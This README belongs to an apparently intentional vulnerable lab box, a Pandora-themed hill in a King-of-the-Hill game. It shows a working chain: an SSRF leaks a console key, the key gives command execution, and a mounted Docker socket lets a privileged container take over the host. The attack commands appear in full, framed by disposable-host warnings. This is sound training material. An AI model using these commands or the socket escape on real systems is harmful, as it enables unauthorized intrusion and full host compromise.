# Hill 15 - Eywa Network (Avatar) (SSRF -> metadata creds -> RCE -> Docker socket host escape)

> **DANGER - run only on a disposable, isolated host.** This hill's privilege escalation is
> an **exposed Docker socket**, which is a full **host takeover** primitive. Never run it on a
> shared machine (e.g. a dev box running other services). The socket mount in
> `docker-compose.yml` is commented out by default so building and a casual `up` do not arm
> the escape. This box ships as **build-verified only** in this repo; it has not been run in
> the maintainer's environment for that reason.

*Theme: Avatar / Pandora.* The living network probes nodes on your behalf.

- **Entry:** `GET /probe?url=...` fetches any URL (**SSRF**). Use it to reach the
  localhost-only metadata service and leak the console key, then drive the console:
  - `GET /probe?url=http://127.0.0.1/internal/creds` -> `console_key=EYWA-...`
  - `GET /console?key=EYWA-...&cmd=...` -> shell. Foothold: `pandora`. Port 80 (8095 locally).
- **Privesc (host escape):** the container is run with `/var/run/docker.sock` mounted. With a
  shell you can command the host Docker daemon to launch a privileged container that mounts
  the host root filesystem, giving **host root**. From the host you then own every hill (e.g.
  `docker exec -u 0 koth-hill-15 sh` to read `/root/root.txt` and write `/root/king.txt`).

## Attack chain

    # 1. SSRF -> leak the console key from the internal metadata service
    KEY=$(curl -s -G http://127.0.0.1:8095/probe --data-urlencode 'url=http://127.0.0.1/internal/creds' | sed 's/.*console_key=//')

    # 2. console RCE -> user flag
    curl -s -G http://127.0.0.1:8095/console --data-urlencode "key=$KEY" --data-urlencode 'cmd=cat /home/pandora/user.txt'

    # 3. host escape via the mounted docker socket (DISPOSABLE HOST ONLY; socket must be mounted).
    #    Create a privileged container that chroots the host and runs a command as host root:
    curl -s -G http://127.0.0.1:8095/console --data-urlencode "key=$KEY" --data-urlencode \
      'cmd=curl -s --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -X POST \
       -d "{\"Image\":\"python:3.12-slim\",\"Cmd\":[\"sh\",\"-c\",\"cat /host/root/root.txt\"],\"HostConfig\":{\"Binds\":[\"/:/host\"],\"Privileged\":true}}" \
       http://localhost/containers/create?name=escape'
    # then start it and read its logs via the socket API (see Docker Engine API docs).

## Run locally (disposable host only)

    # uncomment the docker.sock volume in docker-compose.yml first, then:
    docker compose up -d --build   # app: http://localhost:8095/

## Note

Because the escalation is host-level, there is no meaningful in-container `reset.sh` for it and
this box is excluded from the automated `deploy/smoke-test.sh` run. The SSRF -> creds -> RCE
foothold is self-contained; the host escape depends on the socket mount you opt into.
